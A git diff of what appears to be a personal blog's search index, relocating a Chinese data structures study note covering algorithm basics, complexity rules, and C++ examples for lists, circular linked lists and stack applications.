@@ -105,6 +105,73 @@ class="math inline">\(\phi(n)\)</span>的<code>模逆元</code>,
       </tags>
   </entry>
   <entry>
+    <title>数据结构学习笔记</title>
+    <url>/2023/03/25/%5BNote%5D%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="绪论">绪论</h2>
+<h3 id="算法的定义">算法的定义</h3>
+<p>解决特定问题求解步骤的描述，在计算机中表现为指令的有限序列，并且每条指令表示一个或多个操作。</p>
+<h3 id="算法的特性">算法的特性</h3>
+<ul>
+<li>有限性: 一个算法必须保证执行有限步之后结束.</li>
+<li>确切性: 一个算法的每一步骤必须有确切的定义.</li>
+<li>输入: 一个算法有零个或多个输入, 以刻画运算对象的初始情况,
+所谓零个输入是指算法本身给定了初始条件.</li>
+<li>输出: 一个算法有一个或多个输出. 没有输出的算法毫无意义.</li>
+<li>可行性:
+一个算法的任何计算步骤都是可以被分解为基本可执行的操作，每个操作都能够在有限时间内完成.</li>
+</ul>
+<h3 id="算法的设计要求">算法的设计要求</h3>
+<p>算法设计一般要求满足以下几点：</p>
+<p><strong>1.
+正确性：</strong>算法的执行结果应当满足预先规定的功能和性能要求。即算法应当满足具体问题的需求，设计或选择的算法应当能够正确地反映这种需求，这是衡量算法正确与否的准则。</p>
+<p><strong>2.
+可读性：</strong>一个算法应当思路清晰、层次分明、易读易懂。算法主要是为了人的阅读与交流，其次才是机器执行。可读性好有助于人对算法的理解，而晦涩难懂的算法易于隐藏较多的错误，最终难以调试和修改。</p>
+<p><strong>3.
+健壮性：</strong>当输入不合法的数据时，应当作适当处理，不致于引起严重后果。例如当输入数据不在允许的范围时，算法应能适当地作出反应或处理，而不会产生莫名其妙的输出结果。</p>
+<p><strong>4.
+高效性：</strong>有效地使用存储空间和有高效的时间效率。效率是指的执行时间，如果对于一个问题有多个算法可以解决，那么执行时间短的算法效率就高。存储量需求是指算法执行过程中所需的最大存储空间。一个理想的算法应该是数据所占用的存储空间较小而数据处理的速度较快。</p>
+<h3 id="时间复杂度计算规则">时间复杂度计算规则</h3>
+<ul>
+<li><p>加法规则</p>
+<p><span
+class="math display">\[T(n)=T_1(n)+T_2(n)=O(f(n))+O(g(n))=O(max(f(n),g(n)))\]</span></p></li>
+<li><p>乘法规则</p>
+<p><span class="math display">\[T(n)=T_1(n)\times T_2(n)=O(f(n))\times
+O(g(n))=O(f(n)\times g(n))\]</span></p></li>
+</ul>
+<h3 id="常见的时间复杂度大小顺序">常见的时间复杂度大小顺序</h3>
+<p><span class="math display">\[O(1)&lt;O(\log n)&lt;O(n)&lt;O(n\log
+n)&lt;O(n^2)&lt;O(n^3)&lt;\cdots
+&lt;O(n^k)&lt;O(2^n)&lt;O(n!)&lt;O(n^n)\]</span></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202303251700081.png"
+alt="Quick Review: Big-O Notation" />
+<figcaption aria-hidden="true">Quick Review: Big-O Notation</figcaption>
+</figure>
+<h2 id="线性表">线性表</h2>
+<h3 id="顺序表的插入">顺序表的插入</h3>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SqList</span></span><br><span class="line">&#123;</span><br><span class="line">	ElemType* ptr;  <span class="comment">//数组指针</span></span><br><span class="line">	<span class="type">int</span> length;     <span class="comment">//元素个数</span></span><br><span class="line">	<span class="type">int</span> capacity;   <span class="comment">//数组容量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitSqList</span><span class="params">(SqList*&amp; L, <span class="type">int</span> capacity)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (capacity &lt;= <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L = (SqList*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SqList));</span><br><span class="line">	<span class="keyword">if</span> (!L)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L-&gt;ptr = (ElemType*)<span class="built_in">malloc</span>(capacity * <span class="built_in">sizeof</span>(ElemType));</span><br><span class="line">	<span class="keyword">if</span> (!L-&gt;ptr)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L-&gt;length = <span class="number">0</span>;</span><br><span class="line">	L-&gt;capacity = capacity;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertSqList</span><span class="params">(SqList* L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; L-&gt;length || L-&gt;length == L-&gt;capacity)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;	<span class="comment">//插入失败: 索引错误或容量已满</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (index == L-&gt;length)	<span class="comment">//插入到线性表最后一个元素的后一个</span></span><br><span class="line">		L-&gt;ptr[index] = data;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = L-&gt;length - <span class="number">1</span>; i &gt;= index; i--)</span><br><span class="line">			<span class="comment">//元素从后往前依次向后移动1次, 从后往前避免覆盖</span></span><br><span class="line">		&#123;</span><br><span class="line">			L-&gt;ptr[i + <span class="number">1</span>] = L-&gt;ptr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		L-&gt;ptr[index] = data;</span><br><span class="line">	&#125;</span><br><span class="line">	L-&gt;length++;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisplaySqList</span><span class="params">(SqList* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (L-&gt;length == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[Blank SqList]\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L-&gt;length; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, L-&gt;ptr[i]);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SqList* s = <span class="literal">nullptr</span>;</span><br><span class="line">	<span class="built_in">InitSqList</span>(s, <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">DisplaySqList</span>(s);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">DisplaySqList</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[Blank SqList]</span></span><br><span class="line"><span class="comment">0 1 2 3 4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h3 id="循环单链表插入尾指针表示-带头节点">循环单链表插入(尾指针表示,
+带头节点)</h3>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    ElemType data;</span><br><span class="line">    Node* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitLinkedList</span><span class="params">(Node*&amp; L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">    <span class="keyword">if</span> (!L)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    L-&gt;next = L;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertLinkedList</span><span class="params">(Node*&amp; L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    Node* head = L-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">-1</span>;</span><br><span class="line">    Node* p = head;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == index - <span class="number">1</span>)     <span class="comment">//如果当前节点为要插入位置的前一个节点</span></span><br><span class="line">        &#123;</span><br><span class="line">            Node* newNode = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">            <span class="keyword">if</span> (!newNode)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            newNode-&gt;data = data;</span><br><span class="line">            newNode-&gt;next = p-&gt;next;</span><br><span class="line">            p-&gt;next = newNode;</span><br><span class="line">            <span class="keyword">if</span> (newNode-&gt;next == head)  <span class="comment">//如果新插入的节点是尾节点, 那么把尾指针指向新节点</span></span><br><span class="line">                L = newNode;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next, i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (p != head);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 如果整个循环链表中都没有目标位置, 就返回错误代码-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisplayLinkedList</span><span class="params">(Node* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == L-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Blank LinkedList]\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Node* head = L-&gt;next;</span><br><span class="line">        <span class="keyword">for</span> (Node* p = head-&gt;next; p != head; p = p-&gt;next)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* l = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0 1 2 3 4 5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h3 id="循环单链表合并尾指针表示-带头节点">循环单链表合并(尾指针表示,
+带头节点)</h3>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    ElemType data;</span><br><span class="line">    Node* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitLinkedList</span><span class="params">(Node*&amp; L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">    <span class="keyword">if</span> (!L)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    L-&gt;next = L;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertLinkedList</span><span class="params">(Node*&amp; L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    Node* head = L-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">-1</span>;</span><br><span class="line">    Node* p = head;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == index - <span class="number">1</span>)     <span class="comment">//如果当前节点为要插入位置的前一个节点</span></span><br><span class="line">        &#123;</span><br><span class="line">            Node* newNode = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">            <span class="keyword">if</span> (!newNode)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            newNode-&gt;data = data;</span><br><span class="line">            newNode-&gt;next = p-&gt;next;</span><br><span class="line">            p-&gt;next = newNode;</span><br><span class="line">            <span class="keyword">if</span> (newNode-&gt;next == head)  <span class="comment">//如果新插入的节点是尾节点, 那么把尾指针指向新节点</span></span><br><span class="line">                L = newNode;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next, i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (p != head);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 如果整个循环链表中都没有目标位置, 就返回错误代码-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeLinkedList</span><span class="params">(Node*&amp; La, Node*&amp; Lb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//将b循环链表接到a循环链表的后面</span></span><br><span class="line">    Node* aHead = La-&gt;next;</span><br><span class="line">    Node* bHead = Lb-&gt;next;</span><br><span class="line"></span><br><span class="line">    La-&gt;next = bHead-&gt;next;</span><br><span class="line">    Lb-&gt;next = aHead;</span><br><span class="line">    <span class="built_in">free</span>(bHead);    <span class="comment">//释放b循环链表的头节点</span></span><br><span class="line">    La = Lb;</span><br><span class="line">    Lb = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisplayLinkedList</span><span class="params">(Node* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == L-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Blank LinkedList]\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Node* head = L-&gt;next;</span><br><span class="line">        <span class="keyword">for</span> (Node* p = head-&gt;next; p != head; p = p-&gt;next)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* l1 = <span class="literal">nullptr</span>, *l2=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l1);</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l2);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">2</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">3</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">4</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l1);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l2);</span><br><span class="line">    <span class="built_in">MergeLinkedList</span>(l1, l2);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0 1 2 3 4</span></span><br><span class="line"><span class="comment">5 6 7 8 9</span></span><br><span class="line"><span class="comment">0 1 2 3 4 5 6 7 8 9</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h3 id="栈的应用-括号匹配">栈的应用-括号匹配</h3>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">match</span><span class="params">(<span class="type">char</span> <span class="type">const</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::stack&lt;<span class="type">char</span>&gt; s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == <span class="string">&#x27;(&#x27;</span> || str[i] == <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">push</span>(str[i]);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[i] == <span class="string">&#x27;)&#x27;</span> &amp;&amp; s.<span class="built_in">top</span>() == <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[i] == <span class="string">&#x27;]&#x27;</span> &amp;&amp; s.<span class="built_in">top</span>() == <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout.<span class="built_in">setf</span>(std::ios::boolalpha);</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">match</span>(<span class="string">&quot;[[()[()]]]&quot;</span>) &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">match</span>(<span class="string">&quot;[[()[()]])&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">true</span></span><br><span class="line"><span class="comment">false</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h3 id="栈的应用-进制转换">栈的应用-进制转换</h3>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//无符号数的进制转换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BaseConvert</span><span class="params">(<span class="type">unsigned</span> base, <span class="type">unsigned</span> num, <span class="type">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::stack&lt;<span class="type">char</span>&gt; s;</span><br><span class="line">    <span class="keyword">for</span> (; num; num /= base)</span><br><span class="line">        s.<span class="built_in">push</span>(num % base + <span class="number">0x30</span>);	<span class="comment">//取余并转换为ASCII码</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;!s.<span class="built_in">empty</span>();s.<span class="built_in">pop</span>(), i++)</span><br><span class="line">        str[i] = s.<span class="built_in">top</span>();</span><br><span class="line">    str[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> num = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">2</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2进制: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">8</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;8进制: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">10</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10进制: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">16</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;16进制: %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">2进制: 10010001101000101011001111000</span></span><br><span class="line"><span class="comment">8进制: 2215053170</span></span><br><span class="line"><span class="comment">10进制: 305419896</span></span><br><span class="line"><span class="comment">16进制: 12345678</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Note</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+        <tag>数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[BUUCTF]看我回旋踢</title>
     <url>/2021/11/02/%5BCrypto%5D%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2/</url>
     <content><![CDATA[<p>题目就是一段密文</p>
@@ -245,73 +312,6 @@ href="http://c.biancheng.net/c/ascii/">ASCII码一览表</a>.</p>
         <tag>Docker</tag>
         <tag>TShark</tag>
         <tag>Nmap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>数据结构学习笔记</title>
-    <url>/2023/03/25/%5BNote%5D%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h2 id="绪论">绪论</h2>
-<h3 id="算法的定义">算法的定义</h3>
-<p>解决特定问题求解步骤的描述，在计算机中表现为指令的有限序列，并且每条指令表示一个或多个操作。</p>
-<h3 id="算法的特性">算法的特性</h3>
-<ul>
-<li>有限性: 一个算法必须保证执行有限步之后结束.</li>
-<li>确切性: 一个算法的每一步骤必须有确切的定义.</li>
-<li>输入: 一个算法有零个或多个输入, 以刻画运算对象的初始情况,
-所谓零个输入是指算法本身给定了初始条件.</li>
-<li>输出: 一个算法有一个或多个输出. 没有输出的算法毫无意义.</li>
-<li>可行性:
-一个算法的任何计算步骤都是可以被分解为基本可执行的操作，每个操作都能够在有限时间内完成.</li>
-</ul>
-<h3 id="算法的设计要求">算法的设计要求</h3>
-<p>算法设计一般要求满足以下几点：</p>
-<p><strong>1.
-正确性：</strong>算法的执行结果应当满足预先规定的功能和性能要求。即算法应当满足具体问题的需求，设计或选择的算法应当能够正确地反映这种需求，这是衡量算法正确与否的准则。</p>
-<p><strong>2.
-可读性：</strong>一个算法应当思路清晰、层次分明、易读易懂。算法主要是为了人的阅读与交流，其次才是机器执行。可读性好有助于人对算法的理解，而晦涩难懂的算法易于隐藏较多的错误，最终难以调试和修改。</p>
-<p><strong>3.
-健壮性：</strong>当输入不合法的数据时，应当作适当处理，不致于引起严重后果。例如当输入数据不在允许的范围时，算法应能适当地作出反应或处理，而不会产生莫名其妙的输出结果。</p>
-<p><strong>4.
-高效性：</strong>有效地使用存储空间和有高效的时间效率。效率是指的执行时间，如果对于一个问题有多个算法可以解决，那么执行时间短的算法效率就高。存储量需求是指算法执行过程中所需的最大存储空间。一个理想的算法应该是数据所占用的存储空间较小而数据处理的速度较快。</p>
-<h3 id="时间复杂度计算规则">时间复杂度计算规则</h3>
-<ul>
-<li><p>加法规则</p>
-<p><span
-class="math display">\[T(n)=T_1(n)+T_2(n)=O(f(n))+O(g(n))=O(max(f(n),g(n)))\]</span></p></li>
-<li><p>乘法规则</p>
-<p><span class="math display">\[T(n)=T_1(n)\times T_2(n)=O(f(n))\times
-O(g(n))=O(f(n)\times g(n))\]</span></p></li>
-</ul>
-<h3 id="常见的时间复杂度大小顺序">常见的时间复杂度大小顺序</h3>
-<p><span class="math display">\[O(1)&lt;O(\log n)&lt;O(n)&lt;O(n\log
-n)&lt;O(n^2)&lt;O(n^3)&lt;\cdots
-&lt;O(n^k)&lt;O(2^n)&lt;O(n!)&lt;O(n^n)\]</span></p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202303251700081.png"
-alt="Quick Review: Big-O Notation" />
-<figcaption aria-hidden="true">Quick Review: Big-O Notation</figcaption>
-</figure>
-<h2 id="线性表">线性表</h2>
-<h3 id="顺序表的插入">顺序表的插入</h3>
